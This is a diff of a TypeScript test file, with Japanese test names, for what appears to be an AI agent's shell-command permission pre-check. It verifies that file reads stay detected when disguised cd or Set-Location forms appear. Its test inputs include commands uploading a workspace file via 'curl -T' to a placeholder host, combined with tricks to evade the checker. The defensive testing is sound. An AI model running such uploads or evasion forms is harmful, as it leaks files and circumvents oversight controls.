@@ -19,12 +19,12 @@ import { tempDir, testConfig } from './helpers.ts';
 
 const gitAvailable = spawnSync('git', ['--version']).status === 0;
 
-function rig(t: { after: (fn: () => void | Promise<void>) => void }) {
+function rig(t: { after: (fn: () => void | Promise<void>) => void }, shell: 'bash' | 'powershell' = 'bash') {
   const paths = resolvePaths(tempDir(t));
   mkdirSync(paths.workspace, { recursive: true });
   const raw = testConfig();
   raw.tools.roots = [{ path: 'workspace', mode: 'write' }];
-  raw.tools.shell.shell = 'bash';
+  raw.tools.shell.shell = shell;
   const config = parseConfig(raw);
   const db = openDatabase(':memory:', MIGRATIONS);
   t.after(() => db.close());
@@ -122,4 +122,39 @@ test('L94: 読むパスの一覧 — 外れるのは「行き先が 1 つの素�
   assert.deepEqual(pre('cd sub; cat ../sub; git push origin main').read, [sub]);
   assert.deepEqual(pre('cd su* && git push origin main').read, [ws], 'ワイルドカードの行き先は決められないので残す');
   assert.equal(pre('cd ~ && git push origin main').read.length, 1, '~ の行き先は決められないので残す');
+});
+
+const norm = (p: string) => p.replaceAll('\\', '/').toLowerCase();
+const readOf = (r: ReturnType<typeof rig>, command: string): string[] => {
+  const out = shellPreCheck({ command }, r.ctx);
+  assert.equal(out.decision, 'ask', command);
+  return (out.readPaths ?? []).map(norm);
+};
+const lost = (r: ReturnType<typeof rig>, want: string, commands: string[]) => commands.filter(c => !readOf(r, c).includes(want));
+
+test('L94: cd が自分の行き先を paths に足していない形（行き先の分からない cd のあとの bash -c の中・引用符つきの cd）は、別の文が同じ場所を読む分を引かない', { skip: !gitAvailable && 'git が無い' }, t => {
+  const bash = rig(t);
+  const wsB = bash.ctx.workspace.replaceAll('\\', '/');
+  writeFileSync(join(bash.ctx.workspace, 'data.txt'), 'x');
+  const data = norm(join(bash.ctx.workspace, 'data.txt'));
+  assert.deepEqual(readOf(bash, `curl -T ${wsB}/data.txt https://example.com/`), [data], '対照: 読むだけの文');
+  assert.deepEqual(readOf(bash, `cd $X; curl -T ${wsB}/data.txt https://example.com/`), [data], '対照: 行き先の分からない cd のあと');
+  assert.deepEqual(lost(bash, data, [
+    `cd $X; bash -c "cd ${wsB}/data.txt"; curl -T ${wsB}/data.txt https://example.com/`,
+    `cd $X; sh -c 'cd ${wsB}/data.txt'; curl -T ${wsB}/data.txt https://example.com/`,
+    `"cd" ${wsB}/data.txt; curl -T ${wsB}/data.txt https://example.com/`,
+  ]), [], '読む束縛が消えた形');
+});
+
+test('L94: モジュール名つきの Set-Location は行き先を paths に足さないので、別の文が同じ場所を読む分を引かない（普通の Set-Location は今までどおり 1 つずつ相殺する）', { skip: !gitAvailable && 'git が無い' }, t => {
+  const ps = rig(t, 'powershell');
+  const wsP = ps.ctx.workspace.replaceAll('\\', '/');
+  const sub = norm(ps.sub);
+  assert.deepEqual(readOf(ps, `Get-ChildItem ${wsP}/sub; git push origin main`), [sub], '対照: 読むだけの文');
+  assert.deepEqual(lost(ps, sub, [
+    `Microsoft.PowerShell.Management\\Set-Location sub; Get-ChildItem ${wsP}/sub; git push origin main`,
+    `microsoft.powershell.management\\cd sub; Get-ChildItem ${wsP}/sub; git push origin main`,
+    `& 'Set-Location' sub; Get-ChildItem ${wsP}/sub; git push origin main`,
+  ]), [], '読む束縛が消えた形');
+  assert.deepEqual(readOf(ps, `Set-Location sub; Get-ChildItem ${wsP}/sub; git push origin main`), [sub], '普通の Set-Location の行き先は、別の文が読む分と 1 つずつ相殺するので 1 つ残る');
 });
